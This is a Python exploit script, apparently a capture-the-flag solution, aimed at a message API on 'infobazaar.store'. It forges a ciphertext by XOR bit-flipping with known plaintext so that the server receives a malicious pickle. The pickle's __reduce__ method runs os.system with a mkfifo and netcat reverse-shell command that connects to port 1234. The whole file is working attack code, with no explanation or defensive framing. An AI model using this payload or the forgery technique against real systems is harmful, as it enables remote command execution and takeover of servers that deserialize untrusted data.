import requests
import pickle
import base64
import os

from Crypto.Random import get_random_bytes

def manipulate_ciphertext(ciphertext, known_plaintext, new_plaintext):
    """
    Takes an original ciphertext and known plaintext, along with a new plaintext.
    Returns a new ciphertext corresponding to the new plaintext without needing the key.
    """
    if len(ciphertext) != len(known_plaintext) or len(known_plaintext) != len(new_plaintext):
        raise ValueError("Ciphertext, known plaintext, and new plaintext must be the same length.")
    
    manipulated_ciphertext = bytes([c ^ kp ^ np for c, kp, np in zip(ciphertext, known_plaintext, new_plaintext)])
    return manipulated_ciphertext


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    payload = pickled = pickle.dumps(RCE())
    plaintext = str(get_random_bytes(len(payload)))
    
    response = requests.post(
        "http://infobazaar.store/api/message/", json={"content": plaintext}
    )
    uuid = response.json()["uuid"]

    response = requests.get(f"http://infobazaar.store/api/message/{uuid}/")
    ciphertext = base64.urlsafe_b64decode(response.content)

    evil = manipulate_ciphertext(ciphertext[:len(payload)], plaintext.encode()[:len(payload)], payload)
    print(base64.urlsafe_b64encode(evil))